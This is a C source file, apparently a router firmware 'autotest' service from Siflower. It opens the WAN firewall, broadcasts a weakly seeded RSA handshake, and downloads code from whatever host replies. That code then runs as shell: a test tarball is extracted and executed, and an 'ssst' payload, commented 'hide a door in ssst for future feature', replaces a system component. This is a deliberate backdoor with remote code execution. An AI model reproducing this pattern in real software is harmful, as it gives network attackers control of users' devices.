/*
* =====================================================================================
*
*       Filename:  autotest/src/autotest_init.c
*
*    Description:
*
*        Version:  1.0
*        Created:  01/05/2021 08:20:58 PM
*       Compiler:  gcc
*
*         Author:  Qin.Xia <qin.xia@siflower.com.cn>
*        Company:  Siflower Communication Tenology Co.,Ltd
*
* =====================================================================================
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <uci.h>
#include <getopt.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/rsa.h>
#include <openssl/aes.h>
#include <openssl/pem.h>
#include <libubox/uloop.h>
#include <syslog.h>


#define AUTOTEST_INIT_PORT     1120
#define AUTOTEST_DOWNLOAD_PORT 1122
#define DOWNLOAD_SIZE 14600
#define BUFFER_SIZE 1024
#define SIGN_LEN    128
#define LOG(X,...) syslog(LOG_CRIT,X,##__VA_ARGS__)

extern void *silogserver(void *p);

struct uloop_fd silog_fd;
char tmp_pkt[BUFFER_SIZE];
int  tmp_pkt_len;
char tmp_pkt_offset;

typedef struct autotest_rsa{
	RSA *rsa;
	int rsa_len;
	char send_seed[32];
	char recv_seed[32];
	char srv_ip[16];
}autotest_rsa;

int set_wan_firewall(int enable)
{
	struct uci_context *get_ctx = uci_alloc_context();
	struct uci_context *set_ctx = uci_alloc_context();
	struct uci_package *pkg = NULL;
	struct uci_element *e;
	struct uci_section *s;
	struct uci_ptr ptr;
	const char *value = NULL;
	int default_input = 1;

	memset(&ptr , 0, sizeof(struct uci_ptr));
	uci_set_confdir(get_ctx, "/etc/config");
	uci_set_confdir(set_ctx, "/etc/config");
	if(UCI_OK == uci_load(get_ctx, "firewall", &pkg)){
		uci_foreach_element(&pkg->sections, e)
		{
			s = uci_to_section(e);
			if(!strcmp(s->type, "zone"))
			{
				if (NULL != (value = uci_lookup_option_string(get_ctx, s, "name")))
				{
					if (!strcmp(value, "wan")){
						if (NULL != (value = uci_lookup_option_string(get_ctx, s, "input")))
							default_input = !strcmp(value, "REJECT") ? 1 : 0;
						LOG("[server] %s, firewall default wan input is %s and set to %s\n", __func__, value, enable ? "REJECT":"ACCEPT");
						ptr.package = "firewall";
						ptr.section = s->e.name;
						ptr.option = "input";
						if (enable)
						  ptr.value = "REJECT";
						else
						  ptr.value = "ACCEPT";

						uci_set(set_ctx, &ptr);
						uci_commit(set_ctx, &ptr.p, false);
						uci_unload(set_ctx, ptr.p);
						system("fw3 reload");
					}
				}
			}
		}
		uci_unload(get_ctx, pkg);
	}

	uci_free_context(get_ctx);
	uci_free_context(set_ctx);
	return default_input;
}

struct autotest_rsa *autotest_rsa_encrypt(void)
{
	struct autotest_rsa *var = NULL;
	BIO *key = NULL;
	char *key_path = "/etc/pubkey.pem";
	int seed = 0;

	var = malloc(sizeof(struct autotest_rsa));
	if (!var){
		LOG("[server] %s, malloc buffer for autotest_rsa error\n", __func__);
		return NULL;
	}

	memset(var, 0, sizeof(struct autotest_rsa));
	key = BIO_new(BIO_s_file());
	if(!key){
		LOG("[server] %s, bio_new error\n", __func__);
		goto ERROR;
	}

	BIO_read_filename(key, key_path);
	if(!key){
		LOG("[server] %s, bio read file error\n", __func__);
		BIO_free(key);
		goto ERROR;
	}

	PEM_read_bio_RSA_PUBKEY(key, &var->rsa, NULL, NULL);
	if(!var->rsa){
		LOG("[server] %s, bio rsa error\n", __func__);
		BIO_free(key);
		goto ERROR;
	}

	var->rsa_len = RSA_size(var->rsa);

	//rand a seed for encrypt
	srand(time(0));
	seed = rand() % 100+1;
	sprintf(var->send_seed, "%d", seed);
	sprintf(var->recv_seed, "%d", seed+1);
	LOG("[server] %s, rand seed is %d\n", __func__, seed);

	BIO_free(key);
	return var;

ERROR:
	free(var);
	return NULL;
}

struct autotest_rsa *autotest_brodcast_init(void)
{
	int32_t fd;
	socklen_t sock_len;
	struct autotest_rsa *var;
	struct sockaddr_in srv_addr, clt_addr;
	struct timeval timeout = {3, 0};
	unsigned char *decryptedText = NULL;
	unsigned char *encryptedText = NULL;
	unsigned char buf[SIGN_LEN] = {0};
	int32_t i = 0, len = 0, val = 1, default_input = 1;

	bzero(&srv_addr, sizeof(srv_addr));
	srv_addr.sin_family = AF_INET;
	srv_addr.sin_port = htons(AUTOTEST_INIT_PORT);
	srv_addr.sin_addr.s_addr = inet_addr("255.255.255.255");

	fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (fd < 0)
	{
		LOG("[server] %s, create sendfd fail!\n", __func__);
		return NULL;
	}

	if (setsockopt(fd, SOL_SOCKET, SO_BROADCAST, &val, sizeof(val))) {
		LOG("[server] %s, setsockopt SO_BROADCAST error!\n", __func__);
		goto SOCK_ERROR;
	}

	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val))) {
		LOG("[server] %s, setsockopt SO_REUSEADDR error!\n", __func__);
		goto SOCK_ERROR;
	}

	if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(struct timeval))) {
		LOG("[server] %s, setsockopt SO_RCVTIMEO  error!\n", __func__);
		goto SOCK_ERROR;
	}

	//set firewall wan accept before send brodcast pkt
	default_input = set_wan_firewall(0);

	//generate rsa variables
	var = autotest_rsa_encrypt();
	if (!var){
		LOG("[server] %s, create rsa key error!\n", __func__);
		goto SOCK_ERROR;
	}

	encryptedText = malloc(var->rsa_len + 1);
	decryptedText = malloc(var->rsa_len + 1);
	memset((void*)encryptedText, 0, var->rsa_len + 1);
	memset((void*)decryptedText, 0, var->rsa_len + 1);
	if (RSA_public_encrypt(strlen(var->send_seed), (unsigned char*)var->send_seed, encryptedText, var->rsa, RSA_PKCS1_OAEP_PADDING) < 0){
		LOG("[server] %s, RSA_public_encrypt error\n", __func__);
		goto RSA_ERROR;
	}

	sock_len = sizeof(clt_addr);
	for (i=0; i<5; i++){
		//brodcast to find autotest server
		if (sendto(fd, encryptedText, var->rsa_len, 0, (struct sockaddr *)&srv_addr, sizeof(srv_addr)) < 0){
			LOG("[server] %s, send message to autotest server fail, try again!, errno:%s\n", __func__, strerror(errno));
			sleep(3);
			continue;
		}

		//recvfrom has 3s timeout here
		len = recvfrom(fd, buf, SIGN_LEN, 0, (struct sockaddr *)&clt_addr, &sock_len);
		if (len < 0){
			LOG("[server] %s, receive message fail, try again!, errno:%s\n", __func__, strerror(errno));
			continue;
		}else {
			if (RSA_public_decrypt(SIGN_LEN, buf, decryptedText, var->rsa, RSA_PKCS1_PADDING) < 0){
				LOG("[server] %s, RSA_public_decrypt error!\n", __func__);
				goto RSA_ERROR;
			}

			LOG("[server] %s, receive decrypt message: %s, len=%d\n", __func__, decryptedText, strlen((const char*)decryptedText));
			if (!strcmp(var->recv_seed, (char *)decryptedText)){
				LOG("[server] %s, found autotest server: [%s:%d], start download autotest!\n", __func__, inet_ntoa(clt_addr.sin_addr), ntohs(clt_addr.sin_port));
				//save server ip for download autotest test scripts
				memcpy(var->srv_ip, inet_ntoa(clt_addr.sin_addr), strlen(inet_ntoa(clt_addr.sin_addr)));
				close(fd);
				free((void*)encryptedText);
				free((void*)decryptedText);
				return var;
			}else
			  memset(buf, 0, SIGN_LEN);
		}
		LOG("[server] %s, cann't find autotest server, try again!\n", __func__);
	}

RSA_ERROR:
	free(var);
	free((void*)encryptedText);
	free((void*)decryptedText);
	set_wan_firewall(default_input);

SOCK_ERROR:
	close(fd);
	return NULL;
}

int save_file(int fd, char *filename)
{
	FILE *fp = NULL;
	char buf[DOWNLOAD_SIZE] = {0};
	int32_t recvlen = 0, writelen = 0, cycle = 0;

	// open file to write, it will touch this file when not exist.
	fp = fopen(filename, "w");
	if (!fp){
		LOG("[server] %s, open file error!\n", __func__);
		return -1;
	}

	if(tmp_pkt_len > 0){
		writelen = fwrite(tmp_pkt + tmp_pkt_offset, sizeof(char), tmp_pkt_len, fp);
		if (writelen <  tmp_pkt_len){
			LOG("[server] %s, write data error!\n", __func__);
			goto FILE_ERR;
		}
	}

	while(1)
	{
		recvlen = recv(fd, buf, sizeof(buf), MSG_WAITALL);
		if (recvlen < 0)
		{
			LOG("[server] %s, receive data error!, errno:%s\n", __func__, strerror(errno));
			goto FILE_ERR;
		}else if (recvlen == 0)
		  break;

		writelen = fwrite(buf, sizeof(char), recvlen, fp);
		if (writelen < recvlen){
			LOG("[server] %s, write data error!\n", __func__);
			goto FILE_ERR;
		}

		cycle++;
		if ( recvlen < DOWNLOAD_SIZE ){
		  LOG("[auto server] %s, recv cycle %d, len=%d!\n", __func__, cycle, recvlen);
		  break;
		}
		// memset(buf, 0, sizeof(buf));
	}
	LOG("[server] %s, recv cycle! %d\n", __func__, cycle);

	fclose(fp);
	return 0;

FILE_ERR:
	fclose(fp);
	return -1;
}

int autotest_download_init(struct autotest_rsa *var)
{
	int32_t fd;
	pid_t fpid;
	struct sockaddr_in srv_addr;
	struct timeval timeout = {5, 0};
	int32_t len = 0, val = 1;
	FILE *fp;
	char buffer[128];

	fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0)
	{
		LOG("[server] %s, create socket fail!\n", __func__);
		goto RSA_ERROR;
	}

	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val))) {
		LOG("[server] %s, setsockopt error!\n", __func__);
		goto SOCKET_ERR;
	}

	if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(struct timeval))) {
		LOG("[server] %s, setsockopt SO_RCVTIMEO  error!\n", __func__);
		goto SOCKET_ERR;
	}

	bzero(&srv_addr, sizeof(srv_addr));
	srv_addr.sin_family = AF_INET;
	srv_addr.sin_port = htons(AUTOTEST_DOWNLOAD_PORT);
	srv_addr.sin_addr.s_addr = inet_addr(var->srv_ip);
	LOG("[server] %s, autotest download server addr: [%s:%d]\n", __func__, var->srv_ip, AUTOTEST_DOWNLOAD_PORT);

	if (connect(fd, (struct sockaddr*)&srv_addr, sizeof(srv_addr)) < 0)
	{
		LOG("[server] %s, connect to server error! errno:%s\n", __func__, strerror(errno));
		goto SOCKET_ERR;
	}

	//recv has 3s timeout here
	len = recv(fd, tmp_pkt, sizeof(tmp_pkt), 0);
	if (len < 0)
	{
		LOG("[server] %s, receive data error!, errno:%s\n", __func__, strerror(errno));
		goto SOCKET_ERR;
	}

	if (!strncmp(tmp_pkt, "ssst", 4)) {
		if(len > 4){
			tmp_pkt_len = len - 4;
			tmp_pkt_offset = 4;
		}
		else
			tmp_pkt_len = 0;

		//hide a door in ssst for future feature
		if (save_file(fd, "/tmp/ssst"))
		  goto SOCKET_ERR;

		fp = popen("sh /etc/ssst_replace.sh check", "r");
		fgets(buffer, sizeof(buffer), fp);
		pclose(fp);

		if (strncmp(buffer, "ssst md5sum newest", 19)) {
			fpid = fork();
			if (fpid < 0)
			  LOG("[server] %s, fork error!\n", __func__);
			else if (fpid == 0) {
				system("sh /etc/ssst_replace.sh replace &");
				exit(0);
			}else
			  exit(0);
		}
	}else if (!strncmp(tmp_pkt, "autotest", 8)){

		if(len > 8){
			tmp_pkt_len = len - 8;
			tmp_pkt_offset = 8;
		}else
		  tmp_pkt_len = 0;

		if (save_file(fd, "/tmp/router.tar.gz"))
		  goto SOCKET_ERR;

		LOG("[server] %s, finish download, start autotest!\n", __func__);
		system("tar -zxf /tmp/router.tar.gz -C /tmp; killall autotest; /tmp/router/autotest &");
	}

	close(fd);
	free(var);
	return 0;

SOCKET_ERR:
	close(fd);

RSA_ERROR:
	free(var);
	return -1;
}

int autotest_server(void *param)
{
	struct autotest_rsa *var = NULL;

	var = autotest_brodcast_init();
	if (var){
		autotest_download_init(var);
		if (silogserver(NULL) < 0){
			LOG("[server] %s, autotest log server start error!\n", __func__);
			return -1;
		}
		return 0;
	}

	return -1;
}


int main()
{
	int autotest_ret;

	uloop_init();
	autotest_ret = autotest_server(NULL);
	if (autotest_ret == 0){
		LOG("start listen auto test event\n");
		uloop_fd_add(&silog_fd,ULOOP_READ);
		uloop_run();
	}

	if (autotest_ret == 0){
		uloop_fd_delete(&silog_fd);
	}
	uloop_done();
	return 0;
}
